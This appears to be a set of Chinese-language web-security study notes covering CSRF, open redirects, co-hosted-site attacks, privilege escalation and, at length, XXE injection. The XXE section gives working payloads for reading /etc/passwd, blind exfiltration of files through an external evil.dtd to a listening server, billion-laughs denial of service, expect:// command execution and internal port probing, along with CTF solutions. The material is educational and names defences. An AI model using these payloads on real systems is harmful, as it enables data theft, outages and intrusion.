<p>原理：攻击者盗用了你的身份，以你的名义进行某些非法操作，csrf能够使用你的账户发送邮件，获取你的铭感信息甚至盗走你的财产</p>
<p>步骤：1.登陆受信任网站a，并在本地生成cookie<br>
2.在不登出a的情况下，访问恶意网站b</p>
<figure data-type="image" tabindex="20"><img src="https://jinqipiaopiao.github.io//post-images/1626312003724.png" alt="" loading="lazy"></figure>
<p>csrf与xss的区别：<br>
xss：<br>
攻击者发现xss漏洞--构造代码--发送给受害人--受害人打开--攻击者获取受害人的cookie--完成攻击<br>
攻击者需要登陆后台完成攻击</p>
<p>csf：攻击者发现csrf漏洞--构造代码--发送给受害人--受害人打开--受害人执行代码--完成攻击<br>
攻击时管理员自己实现的，攻击者只负责了构代码</p>
<p>csrf少了获取cookie的步骤，因为受害人在执行恶意代码的时候就已经完成了攻击而攻击者并没有参与进来</p>
<p><strong>漏洞分类</strong><br>
get：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626312012585.png" alt="" loading="lazy"></p>
<p>post：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626312017365.png" alt="" loading="lazy"></p>
<p>常见的csrf方式</p>
<pre><code>&lt;img&gt;标签属性
&lt;img src=“http://漏洞地址”&gt;

&lt;script&gt;标签属性
&lt;script src=“http://漏洞地址”&gt;

&lt;iframe&gt;标签属性
&lt;iframe src=“http://漏洞地址”&gt;

JavaScript方法
Image对象
&lt;script&gt;
var foo = new Image();
foo.src = “http://漏洞地址”
&lt;/script&gt;
</code></pre>
<p>防御：<br>
验证HTTP Referer字段<br>
Token验证<br>
添加验证码</p>
<h1 id="url重定向">url重定向</h1>
<p>由于应用越来越多的需要和其他的第三方应用交互，以及在自身应用内部根据不同的逻辑将用户引向到不同的页面，例如一个典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致一些安全问题，特定条件下可能引起严重的安全漏洞。</p>
<p><strong>客户端重定向：</strong><br>
用户浏览器的地址栏URL会用变化</p>
<p>http://www.test.com/test1.php<br>
点击“登录”后会指向<br>
http://www.test.com/login.php</p>
<p><strong>服务端重定向：</strong><br>
用户浏览器的地址栏URL不会变化</p>
<p>http://www.test.com/test1.php<br>
点击“登录”后浏览器的地址栏URL不会变化，但页面会变化</p>
<p>能够重定向道任意域名叫做自由重定向，自由重定向可能会导致用户在不知情的情况下被带到其他域名的网站，从而遭到钓鱼攻击</p>
<p>自由重定向示例：<br>
http://example.jp/?continue=http://trap.example.com/<br>
通过以上url跳转到http://trap.example.com/<br>
钓鱼攻击的常见手段为：将用户带到伪装成著名网站的恶意网站并诱使用户输入个人呢信息</p>
<p>攻击方式<br>
一个典型的登录跳转如下：</p>
<pre><code>&lt;?php
$url=$_GET['id'];
header(&quot;Location: $url&quot;);
?&gt;
</code></pre>
<p>id没有任何限制，因此提交</p>
<p>http://localhost/test.php?id=http://sangfor.com.cn</p>
<p>钓鱼攻击的利用<br>
Phishing Frenzy<br>
https://www.phishingfrenzy.com/<br>
https://github.com/pentestgeek/phishing-frenzy</p>
<p>Weeman<br>
https://github.com/Hypsurus/weeman<br>
Weeman</p>
<pre><code>help

show     : show default settings.
set         : set value for option (set &lt;option&gt; &lt;value&gt;).
run        : start the server.
clear      : clear screen.
help       : show help or (help &lt;option&gt;.)
framework   : load the modules framework.
quit        : quit.
</code></pre>
<p><strong>修复方案</strong><br>
加入referer的限制，保证该url的有效性，避免恶意用户自己生成跳转链接<br>
加入有效性验证token，避免用户生成自己的恶意链接从而被利用（但是如果功能本身要求比较开放，可能会产生一定的限制）<br>
设置严格白名单及网络边界，功能要求比较开放的情况下，需要严格限定协议以及可访问的网络</p>
<h1 id="旁注攻击提权思路">旁注攻击&amp;提权思路</h1>
<p>旁注攻击即攻击者在攻击目标时，对目标网站“无从下手”，找不到漏洞时候，攻击者就可能会通过具有同一服务器的网站渗透到目标网站，从而获取目标站点的权限。这一个过程就是旁注攻击的过程。</p>
<pre><code>  一般的虚拟空间，VPS（虚拟专用服务器）或与他人合租的服务器，也有一些企业的多个业务系统在同一服务器中。当多个网站放置在同一服务器时，目标网站设计得非常安全，但并不能保证同一服务器上的所有网站都是安全的。
</code></pre>
<p>VPS（Virtual Private Server 虚拟专用服务器）技术，将一台服务器分割成多个虚拟专享服务器的优质服务。实现VPS的技术分为容器 [1]  技术，和虚拟化技术 [2]  。在容器或虚拟机中，每个VPS都可分配独立公网IP地址、独立操作系统、实现不同VPS间磁盘空间、内存、CPU资源、进程和系统配置的隔离，为用户和应用程序模拟出“独占”使用计算资源的体验。VPS可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。VPS为使用者提供了管理配置的自由，可用于企业虚拟化，也可以用于IDC资源租用。</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626315944733.png" alt="" loading="lazy"><br>
如图所示：一个服务器可能存在多个网站或者多个数据库，如test1.com test2.com test3.com test4.com，web应用程序分别在D盘的test1 test2 test3 test4 目录中，分别使用了mysql和sqlserver两种数据库。<br>
那么，当目标test1没发现漏洞时，而在test2中发现了漏洞获取了mysql的root权限，那就能直接影响到test1的数据库<br>
那么，当目标为test3时，因不同的数据库关系，这时就得对服务器进行提权了</p>
<p><strong>方法</strong></p>
<p>1.IP逆向查询<br>
通过IP逆向查询可以查到部署在同一web服务器上的其他网站<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626316044451.png" alt="" loading="lazy"><br>
如常用的查询站点：<br>
http://www.yougetsignal.com/tools/web-sites-on-web-server/<br>
http://s.tool.chinaz.com/same<br>
http://www.114best.com/ip/<br>
http://dns.aizhan.com/</p>
<p>2.CDN查询<br>
说到旁注攻击，就不得不提起CDN，服务器使用CDN之后，真实的IP将会隐藏起来，攻击者无法找到目标主句的，也就无法进行旁注攻击。CDN即内容分发网络，其基本思路是：尽可能地避开互联网上有可能影响数据传输速度和稳定性的瓶颈，环节，使内容的传输速度更快，更稳定</p>
<p>1.网站查询<br>
http://www.cdnplanet.com/tools/cdnfinder/<br>
http://www.17ce.com/<br>
2.分析二级域名的解析地址<br>
3.分析服务器IP的历史变化<br>
http://toolbar.netcraft.com/<br>
4.查找隐藏在网站目录类似phpinfo()的函数页面，能直接显示出服务器的相关     配置，看目录扫描的自带强大程度</p>
<p><strong>提权简述</strong></p>
<p>提权是将服务器的普通用户提升为管理员用户的一种操作，提权常常用于旁注。<br>
例如：攻击者己经获取到目标网站的同一服务器的任意网站，通过对服务器提权拿到了服务器管理员权限，当拥有服务器的管理员权限后，几乎可以对服务器进行任何操作，更何况是服务器上存放的一个网站呢？换句话说，有时旁注攻击成功的关键就是看服务器提权成功与否。</p>
<p>攻击者对服务器提权一般分为两种：<br>
一种是溢出提权，另一种是第三方组件提权。（其他的：社工提权）</p>
<p>溢出提权</p>
<p>是指攻击者利用系统本身或系统中软件的漏洞来获取root权限，其中溢出提权又分为远程溢出和本地溢出<br>
远程溢出是指攻击者只需与服务器建立连接，然后根据系统漏洞，使用相应的溢出程序，即可获取到远程服务器的root权限，例如知名的ms-08067<br>
本地溢出是主流的提权方式，攻击者通常会向服务器上传本地溢出程序在服务器指执行，如果系统村子啊漏洞，那么将会溢出root权限</p>
<figure data-type="image" tabindex="21"><img src="https://jinqipiaopiao.github.io//post-images/1626316783900.png" alt="" loading="lazy"></figure>
<h1 id="2021-07-19">2021-07-19</h1>
<h1 id="网络安全绪论">网络安全绪论</h1>
<p>**攻击的过程：**准备阶段，实施阶段，售后阶段<br>
准备阶段：确定攻击目标，信息收集，服务分析，系统分析，漏洞分析<br>
实施阶段：缓冲区溢出，拒绝服务，后门，木马，病毒<br>
售后阶段：留下后门，隐藏踪迹</p>
<p>**防护措施：**个人防护措施，常用的防护措施<br>
个人防护措施：防火墙，加密重要文件，杀毒软件定期升级和杀毒，定期备份系统或重要文件，定期升级补丁<br>
常用的防护措施：完善安全管理制度，采取访问控制措施，运行数据加密措施，数据备份与恢复</p>
<p>**现状：**攻击者需要的技术水平逐渐降低，手段更加灵活，联合攻击急剧增多</p>
<p>**0day漏洞：**在安全补丁发布前被了解和掌握的漏洞信息</p>
<p>**设计准则：**木桶原则，整体性原则，安全性评价与平衡原则，标准化与一致性原则，技术与管理相结合原则，统筹规划分步实施原则，等级性原则，动态发展原则，易操作原则</p>
<p>**威胁信息系统的主要方法：**冒充，旁路控制，破化信息的完整性，破坏系统的可用性，重放，截收和辐射侦探，陷门，特洛伊木马，抵赖</p>
<p>**挂马：**通过各种手段，SQL注入，网站敏感文件扫描，服务器漏洞，网站程序0day，等各种方法获得管理员账户，登陆网站后台，或者webshell，修改网站的内容上传木马等。</p>
<p>**安全策略：**定义，目的，必要性，基本原则<br>
定义：针对那么些被允许进入某一组，可以访问网站技术资源和信息资源所规定，必须遵守的规则<br>
目的：觉得一个组织机构应该怎样保护自己，阐明机构安全政策的总体思想，让所有用户，操作人员和管理员清楚，为了保护技术和信息资源所必须遵守的原则，提供一个可获得，能够配置和检查的用于确定是否与计算机和网络系统的策略一致的基准<br>
必要性：强调了策略的核心作用，强调了检测，响应，防护的动态性，检测，响应，防护必须遵循的安全策略进行<br>
基本原则：适用性，可行性，动态性，简单性，系统性</p>
<p>**定义：**基本定义，简单说明，包括<br>
定义：系统硬件，软件受到保护，不因偶然恶意的破坏，更改，泄露，能连续，可靠正常的运行，服务不中断<br>
简单说明：能够识别和消除不安全因素的能力<br>
包括：运行系统的安全，网络上系统信息的安全，网络上信息传播的安全</p>
<p>**体系层次：**物理层安全，系统层安全，网络层安全，应用层安全，管理层安全</p>
<p>**基本需求：**可靠性，可用性，保密性，不可抵赖性，可控性，可审查性，真实性</p>
<p>**威胁的主要因素：**信息系统自身安全的脆弱性，操作系统与应用程序漏洞，安全管理问题，黑客攻击，网络犯罪</p>
<p><strong>黑客入侵行为模型图：</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626663738651.png" alt="" loading="lazy"></p>
<p>解说：黑客入侵一般的完整模式为：踩点-&gt;扫描-&gt;查点-&gt;分析并入侵-&gt;获取权限-&gt;提升权限-&gt;扩大范围-&gt;安装后门-&gt;清除日志，这几个大的行为模块<br>
资源扩张：指利用已获得的密码尝试登陆其他主机或者其他服务<br>
其他手段：值类似于发送E-mail的方式，比如通过恶意网页等其他欺骗方式。还包括进来一些利用winnt/2k会话缺陷在远程嗅探其密码的新攻击方法<br>
踩点：大多数的dns服务器允许用户获取域名记录文件内容，这样就可以了解到网站的详细网络分布结构。另外网络服务商可以查询得到公司地址及人员内部邮件，电话等等，以及单位注册的ip范围等重要信息。又是这一步骤会比扫描还重要</p>
<h1 id="xxexml-external-entity-attackxml外部实体注入攻击">XXE(XML External Entity attack)XML外部实体注入攻击</h1>
<p>导语<br>
　　XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的simplexml_load 默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string（）。</p>
<p>尽管XXE漏洞已经存在了很多年，但是它从来没有获得它应有的关注度。很多XML的解析器默认是含有XXE漏洞的，这意味着开发人员有责任确保这些程序不受此漏洞的影响。 比如今年7月刚爆出的微信支付XXE漏洞案例。</p>
<p>libxml2.9.1及以后，默认不解析外部实体。可以在此了解libxml各版本具体改动情况。本次测试在Window下使用的php5.4.45(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。当XML声明中standalone值是yes的时候表示DTD仅用于验证文档结构，外部实体将被禁用。但它的默认值是no，而且有些parser会直接忽略这一项。</p>
<p>XML外部实体<br>
　　本文主要讲外部实体注入攻击，所以基本的XML语法就不过多的描述。主要看一下DTD-实体。</p>
<p>首先让我们了解一下基本的PAYLOAD结构：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702514550.png" alt="" loading="lazy"><br>
DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626832773670.png" alt="" loading="lazy"><br>
<strong>实体分为一般实体和参数实体</strong></p>
<p>1.一般实体的声明：<!ENTITY 实体名称 "实体内容"></p>
<p>引用一般实体的方法：&amp;实体名称;</p>
<p>p.s.经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</p>
<p>2.参数实体的声明：<!ENTITY % 实体名称 "实体内容"></p>
<p>引用参数实体的方法：%实体名称;</p>
<p>p.s.经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。</p>
<p>如果实体名称中出现如&lt;的特殊字符，解析就会失败。为了避免这种情况，XML用实体引用替换特殊字符。XML预定义了五个实体引用，即用&lt;、 &gt;、 &amp;、 &amp;apos、 &quot;替换&lt;、&gt;、&amp;、'、&quot;。</p>
<p><strong>DTD实体声明（重点</strong>）</p>
<p><strong>1.内部实体声明</strong></p>
<p><!ENTITY 实体名称 "实体的值"></p>
<p>当引用一般实体时，由三部分构成：&amp;、实体名、；，当是用参数传入xml的时候，&amp;需URL编码，不然&amp;会被认为是参数间的连接符号。</p>
<p>示例：</p>
<pre><code>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY writer &quot;Dawn&quot;&gt;
&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;
]&gt;
&lt;test&gt;&amp;writer;©right;&lt;/test&gt;
</code></pre>
<p><strong>2. 外部实体声明</strong></p>
<pre><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;
</code></pre>
<p>外部实体可支持http、file等协议。不同程序支持的协议不同，如下图：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702482719.png" alt="" loading="lazy"><br>
其中PHP支持的协议会更多一些，但是需要一定的扩展支持：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702456017.png" alt="" loading="lazy"><br>
　示例：</p>
<pre><code>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;
&lt;!DOCTYPE test [
&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;
]&gt;
&lt;author&gt;&amp;file;©right;&lt;/author&gt;
</code></pre>
<p><strong>XXE的攻击与危害</strong><br>
　　当我们了解清楚以上的信息后，我们就能理解如何构造外部实体注入攻击与它的危害性了。</p>
<p>如何构造外部实体注入攻击<br>
　　一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p>
<p>有回显的payload写法：</p>
<p>直接通过DTD外部实体声明。XML内容如下：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre>
<p>通过DTD文档引入外部DTD文档，再引入外部实体声明。XML内容如下：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;
&lt;abc&gt;&amp;b;&lt;/abc&gt;
</code></pre>
<p>evil.dtd内容：</p>
<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
</code></pre>
<p>通过DTD外部实体声明引入外部实体声明。XML内容如下:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY % d SYSTEM &quot;http://localhost/evil.dtd&quot;&gt;
%d;
]&gt;
&lt;abc&gt;&amp;b;&lt;/abc&gt;
</code></pre>
<p>evil.dtd内容：</p>
<pre><code>&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
</code></pre>
<p>但是如果想通过如下声明是不可以的：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
&lt;!DOCTYPE a [
&lt;!ENTITY d SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
]&gt;
&lt;abc&gt;&amp;d;&lt;/abc&gt;
</code></pre>
<p>测试发现这种实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，参数实体就好用很多。</p>
<p>无回显的payload写法：</p>
<p><strong>第一种无回显示payload写法：</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; 
&lt;!DOCTYPE a [
&lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt; 
%dtd; %all; 
]&gt; 
&lt;abc&gt;&amp;send;&lt;/abc&gt;
</code></pre>
<p>其中evil.xml文件内容为</p>
<pre><code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://localhost%file;'&gt;&quot;&gt;
</code></pre>
<p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用实体send。</p>
<p><strong>第二种无回显payload写法：</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
%dtd;
%send;
]&gt;
&lt;abc&gt;&lt;/abc&gt;
其中evil.xml文件内容为：

&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM 'http://localhost/?content=%file;'&gt;&quot;&gt; %payload;
</code></pre>
<p>调用过程和第一种方法类似，但最里层的嵌套里%要进行实体编码成%。无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>
<p>这里注意参数实体引用%file;必须放在外部文件里，因为根据这条 规则 。在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： PEReferences forbidden in internal subset。这里的        internal subset指的是中括号[]内部的一系列元素声明，PEReferences 指的应该是参数实体引用 Parameter-Entity Reference 。</p>
<p>一般都使用第二种方法，因为当文件中含有中文字符或&lt;字符，会导致不能解析。</p>
<p><strong>XXE带来的危害</strong><br>
　　利用xxe漏洞可以进行文件读取，拒绝服务攻击，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等。内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做。</p>
<p>首先准备一个有XXE漏洞的文件，本次测试以php为主：</p>
<pre><code>&lt;?php
$xml = simplexml_load_string($_REQUEST['xml']);
echo &quot;&lt;pre&gt;&quot; ;
print_r($xml);//注释掉该语句即为无回显的情况
?&gt;
</code></pre>
<p><strong>危害1.读取任意文件</strong></p>
<p>有回显情况:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;file:///E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626702413435.png" alt="" loading="lazy"><br>
无回显情况:</p>
<p>本次测试用的phpStudy，需开启apache日志记录并重启服务。当无回显情况时，可以讲数据发送到远程服务器。</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=E://phpStudy/PHPTutorial/WWW/etc/passwd.txt&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
%dtd;
%send;
]&gt;
&lt;abc&gt;&lt;/abc&gt;
</code></pre>
<p>远程服务器部署evil.xml内容为:</p>
<pre><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM 'http://localhost/?content=%file;'&gt;&quot;&gt; %payload;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626702211666.png" alt="" loading="lazy"><br>
YWRtaW46OnBhc3N3b3JkIQ0KdGVzdDo6cGFzc3dkIQ==Base64解码即可。</p>
<p>通过此方法可以读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件、获取帐号密码后进一步攻击。如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
<p><strong>危害2.拒绝服务攻击</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE lolz [
&lt;!ENTITY lol &quot;lol&quot;&gt;
&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
</code></pre>
<p>此示例就是著名的Billion laughs attack该攻击是通过创建一项递归的 XML 定义，在内存中生成十亿个&quot;Ha！&quot;字符串，从而导致 DoS 攻击。</p>
<p>原理：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p>
<p><strong>危害3.远程命令(代码)执行</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;expect://id&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre>
<p>此示例是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能有此漏洞。</p>
<p><strong>危害4.内网信息探测</strong></p>
<p>利用http协议http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果。</p>
<p>有回显情况：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;http://127.0.0.1:87/tets.txt&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre>
<p>当端口开放时，如80端口：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702632954.png" alt="" loading="lazy">)<br>
当端口未开放时，如81端口:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702272399.png" alt="" loading="lazy"><br>
无回显情况：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:81/&quot;&gt;
&lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;
%dtd;
%send;
]&gt;
&lt;abc&gt;&lt;/abc&gt;
</code></pre>
<p>远程服务器部署evil.xml内容为:</p>
<pre><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM 'http://localhost/?content=%file;'&gt;&quot;&gt; %payload;
</code></pre>
<p>观察日志文件即可。</p>
<p>当端口开放时，如80端口:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702609532.png" alt="" loading="lazy"><br>
当端口未开放时，如81端口:<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702614433.png" alt="" loading="lazy"><br>
有的无回显的情况还可以通过抓包看响应头返回的状态码，返回的报错信息等判断。</p>
<p><strong>危害5.攻击内网网站</strong></p>
<p>难得搭建环境，就直接引用网上的例子吧：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702620816.png" alt="" loading="lazy"><br>
这个示例是攻击内网strusts2网站，远程执行系统命令。</p>
<p>还可部署bash文件建立监听，获得反弹shellcode等。</p>
<p>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
<p>CTF题目</p>
<p><strong>JarvisOJ——api调用</strong><br>
请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
<p>题目入口：http://web.jarvisoj.com:9882/</p>
<p>先查看源码：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702685525.png" alt="" loading="lazy"><br>
再看响应<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626702690221.png" alt="" loading="lazy"><br>
开始以为是考反序列化，但根据提示和结果发现不是。这个页面仅仅是向后台发送请求，后台再响应返回几个特定的字符串，修改请求值，发现返回与前台的输入没多大关系。最后，知道是XXE。</p>
<p>这道题目，默认的是json格式传递，因此首先我们更改Content-Type的值为application/xml，然后传入xml代码：</p>
<pre><code>&lt;?xml version=”1.0″?&gt;
&lt;!DOCTYPE a[
&lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot;&gt;]&gt;
&lt;abc&gt;&amp;xxe;&lt;/abc&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1626702695371.png" alt="" loading="lazy"><br>
DDCTF——喝杯Java冷静下<br>
http://116.85.48.104:5036/gd5Jq3XoKvGKqu5tIH2p/</p>
<p>提示：第二层关卡应用版本号为2.3.1</p>
<p>此题目有点难，由于技术不到位，有的地方不是很清楚就不误导读者了。</p>
<p>直接看看大佬的姿势吧：</p>
<p>DDCTF2018 WEB6 喝杯Java冷静下 WRITEUP —— LZ1Y</p>
<p>DDCTF 2018 Web Writeup —— 白帽100安全攻防实验室</p>
<p>真实案例<br>
微信支付XXE漏洞 再提一次刚爆出的微信XXE漏洞，还可以欣赏一篇对此漏洞的修复文章。</p>
<p>在线文件预览引起的问题，修改docx文件的word/document.xml，添加DTD和实体引用，即可触发，可据此生成恶意的Word文档。</p>
<pre><code>[WooYun-2014-73321（网易邮箱某处XXE可读取文件）](http://www.anquan.us/static/bugs/wooyun-2014-073321.html)

[WooYun-2014-73439（QQ邮箱XXE可读取任意文件）](http://www.anquan.us/static/bugs/wooyun-2014-073439.html)
直接处理POST XML数据。许多都是直接 simplexml_load_string() 处理POST进来的数据。可控字符串出现在XML文件里就要引起注意。

[WooYun-2015-109725（中通某处XXE漏洞可读取服务器任意文件）](http://www.anquan.us/static/bugs/wooyun-2015-0109725.html)
</code></pre>
<p>XML处理工具</p>
<p>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）格式化XML。</p>
<p>WooYun-2015-134057（百度某平台Blind XXE漏洞&amp;可Bool型SSRF攻击）XML检查工具。</p>
<p>WooYun-2015-135397（搜狗某平台Blind XXE漏洞(读取文件/SSRF/Struts2命令执行) XML检查工具。<br>
WooYun-2014-58381（百度某功能XML实体注入）该功能点提供svg转jpg服务，通过构造特殊svg文件注入。</p>
<p>WooYun-2014-59783（百度某功能XML实体注入（二））在第一次修复后只过滤了ENTITY这个词，DTD 本身就支持调用外部的DTD文件，因此我们只需要在svg里加一个外部的DTD就绕过了。</p>
<p>WooYun-2014-74069（鲜果网RSS导入Blind XXE漏洞 ）导入OPML文件。</p>
<p>WooYun-2015-111828（博客园某处XXE可下载任意文件）博客搬家功能，导入XML。</p>
<p>WooYun-2015-117316（用友人力资源管理软件全版本XXE漏洞 ）登陆与重置密码时使用XML传输数据。</p>
<p>WooYun-2015-148793（AOL Website XML External Entity(XXE) Vulnerability）xmlrpc service。</p>
<p>WooYun-2015-156208（国际php框架slim架构上存在XXE漏洞（XXE的典型存在形式））服务端根据请求的 content-type 来区别对待提交的数据。application/x-www-form-urlencoded 、application/json 、application/xml 被用不同的方式解析。XML直接调用 simplexml_load_string 处理导致漏洞。有趣的是旧版本对该问题做了防范，新版本去除了相关代码，可能是觉得新版本对PHP版本需求在5.5以上。实际上PHP是否解析外部实体与本身版本无关，与编译时libxml库版本有关。</p>
<p>WooYun-2016-168457（唯品会存在Blind XXE 漏洞）。作者说 关于XXE，觉得漏洞本身没太多的玩点，比较有意思主要在于：不同语言处理URI的多元化和不同XML解析器在解析XML的一些特性。 xfire是流行的webservice开发组件，其在invoke时使用了STAX解析XML导致XML实体注入发生 。乌云上一大波XXE洞都是这个，详细说明见 WooYun-2016-166751(Xfire文件读取漏洞)。</p>
<p>WooYun-2014-59911（从开源中国的某XXE漏洞到主站shell）XXE读取到脚本文件/home/run/ssh_go.sh，内含SSH登陆密码。</p>
